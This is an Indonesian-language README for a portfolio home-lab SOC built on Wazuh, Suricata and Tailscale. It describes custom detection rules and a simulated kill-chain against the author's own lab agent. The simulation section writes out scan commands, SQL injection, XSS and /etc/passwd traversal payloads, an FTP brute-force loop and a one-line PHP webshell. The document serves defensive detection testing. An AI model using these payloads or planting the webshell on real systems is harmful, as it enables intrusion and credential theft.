# 🛡️ Enterprise-Grade Mobile SOC Home Lab

**Status Proyek:** Selesai & Beroperasi  
**Fokus Utama:** SIEM, Network IDS, VPN Mesh Overlay, Detection Engineering  

---

## 📌 Deskripsi Proyek
Proyek ini bertujuan membangun ekosistem *Security Operations Center* (SOC) skala lab yang portabel dan tahan terhadap perubahan infrastruktur jaringan. Fokus utama proyek ini adalah optimasi *pipeline* log, *Detection Engineering* untuk berbagai vektor serangan (Web, Network, Auth, FIM), serta penerapan arsitektur *Zero-Trust Network* menggunakan VPN Mesh.

> **Catatan Portofolio:** Infrastruktur lab ini dirancang khusus agar tetap beroperasi secara *real-time* meskipun berpindah jaringan Wi-Fi publik, secara akurat mensimulasikan lingkungan *Enterprise Site-to-Site*.

---

## 🏗️ Topologi & Arsitektur Jaringan
Untuk mengatasi kendala IP Dinamis (DHCP) yang sering memutus koneksi antara Agent dan SIEM, lab ini dihubungkan menggunakan protokol WireGuard melalui **Tailscale Overlay Network**.

* **Wazuh Manager (SIEM & Otak Deteksi):** Bertindak sebagai sentral pengumpulan dan analisis log.
* **Wazuh Agent (Target Serangan):** Berjalan di dalam Virtual Machine (Ubuntu) dengan konfigurasi jaringan NAT.
* **Konektivitas VPN Mesh:** Kedua *node* diberikan IP Statis permanen (`100.x.x.x`) oleh Tailscale. Hal ini memastikan Agent selalu berstatus **Active** dan log serangan selalu terkirim dengan aman menembus NAT/Firewall jaringan lokal.

*(Ganti teks ini dengan screenshot/diagram topologi Anda)* `![Diagram Arsitektur](images/topology-diagram.png)`

---

## ⚙️ System Tuning & Optimasi Limitasi Log
Log tingkat lanjut yang dihasilkan oleh Suricata (Network IDS) memiliki *fields* JSON yang sangat besar. Secara standar, hal ini menyebabkan *error* `Too many fields for JSON decoder` pada *engine* Wazuh dan memblokir masuknya log.

**Resolusi Teknis:** Memperbesar kapasitas *buffer* JSON secara manual di mesin Manager.
* **File Konfigurasi:** `/var/ossec/etc/local_internal_options.conf`
* **Parameter yang dioptimasi:**
  ```text
  analysisd.max_json_decode_fields=8192
  analysisd.decode_recursion_level=30

## 🧠 Detection Engineering (Custom Ruleset)
Pengembangan ruleset deteksi ancaman ditulis menggunakan sintaks native OS_Regex Wazuh. Aturan dirancang dengan arsitektur Parent-Child yang ketat (menginduk pada if_sid) untuk mencegah False Positives, menghemat penggunaan CPU regex engine, dan menghindari The Blackhole Effect dari rules bawaan.

**Fokus Deteksi (MITRE ATT&CK Matrix):**
* **Reconnaissance (TA0043):** Memadukan log dari web server (User-Agent agresif) dan Suricata untuk mendeteksi Nmap dan Web Scanners (Nikto, SQLMap).
* **Initial Access & Execution (TA0001 & TA0002):** Menggunakan teknik URL-encoding regex dan parameter spasi (\s+) untuk mendeteksi SQL Injection, XSS, LFI, dan RCE tanpa memicu alarm palsu pada lalu lintas web normal.
* **Credential Access (TA0006):** Melindungi layanan vsFTPd dengan aturan berbasis frekuensi (contoh: 5 kegagalan dalam 60 detik memicu Alert Level 10).
* **Persistence (TA0003):** Menggunakan regex anchor ($) pada ekstensi File Integrity Monitoring (FIM) untuk secara presisi mendeteksi penanaman webshell berekstensi .php.

<rule id="100201" level="10">
  <if_sid>31101,31103,31104,31108</if_sid>
  <regex ignorecase="yes">union.*select</regex>
  <description>--[SQLi]-- UNION SELECT Attack</description>
  <group>web,attack,sqli,</group>
</rule>
(File XML lengkap tersedia di repositori ini pada folder /rules)

## ⚔️ Attack Simulation (Full Kill-Chain)
Bagian ini mendemonstrasikan efektivitas ruleset melalui simulasi serangan nyata. Semua pengujian telah berhasil memicu Alert Kritis (Level 10-12) di Wazuh Dashboard secara real-time via terowongan Tailscale.

**Fase 1: Reconnaissance (Pengintaian)** 
  *Deskripsi:* Mengirimkan paket pemindaian agresif untuk memetakan port terbuka dan kerentanan aplikasi web. Ini memicu deteksi Suricata di level jaringan dan deteksi Apache di level aplikasi.
  ```
# Pemindaian Port Agresif Nmap
nmap -sV -p 21,22,80 -A <IP_TAILSCALE_AGENT>

# Pemindaian Kerentanan Web (Nikto)
curl -s -A "Nikto" http://<IP_TAILSCALE_AGENT>
```
**Fase 2: Web Application Attacks (Eksploitasi Web)**
*Deskripsi:* Menguji tingkat kepekaan ruleset HTTP terhadap injeksi payload berlapis. Serangan diluncurkan ke parameter URL untuk mendeteksi pencurian kredensial (SQLi), eksekusi skrip (XSS), dan pembacaan berkas sensitif (LFI).
```
# Skenario SQL Injection (UNION SELECT)
curl -s "http://<IP_TAILSCALE_AGENT>/finance-app/?id=1%20UNION%20SELECT%20user,password"

# Skenario Cross-Site Scripting (XSS)
curl -s "http://<IP_TAILSCALE_AGENT>/finance-app/?name=<script>alert('SOC-Test')</script>"

# Skenario Local File Inclusion (LFI) ke /etc/passwd
curl -s "http://<IP_TAILSCALE_AGENT>/finance-app/?page=../../../../etc/passwd"
```

**Fase 3: Authentication Attack (Brute Force)**
*Deskripsi:* Menyimulasikan taktik Credential Access di mana peretas mencoba menebak kata sandi layanan FTP secara brutal. Script otomatis ini didesain untuk menabrak ambang batas korelasi Wazuh (5 kegagalan login dalam 60 detik).
```
# Looping 6 kali kegagalan otentikasi FTP secara agresif
for i in {1..6}; do curl -s -u hacker:passwordSalah ftp://<IP_TAILSCALE_AGENT>; done
```
**Fase 4: Post-Exploitation & Persistence (Penanaman Backdoor)**
Deskripsi: Fase akhir dari Kill-Chain. Menyimulasikan skenario di mana peretas telah mendapatkan akses shell dan menanamkan file PHP berbahaya (webshell) ke direktori webroot. Tindakan ini memicu respons deteksi anomali dari sensor FIM.
```
# Dieksekusi secara lokal di mesin Agent untuk mensimulasikan file drop
echo "<?php system(\$_GET['cmd']); ?>" | sudo tee /var/www/html/shell.php
```
## 🚨 Hasil Deteksi (Threat Hunting Dashboard)
Semua simulasi serangan di atas secara konsisten berhasil ditangkap oleh sensor Wazuh dan diteruskan melalui VPN mesh Tailscale tanpa adanya log drop. Sistem memicu Alert Kritis (Level 10-12) dengan klasifikasi teknik serangan yang presisi sesuai framework MITRE ATT&CK.



  
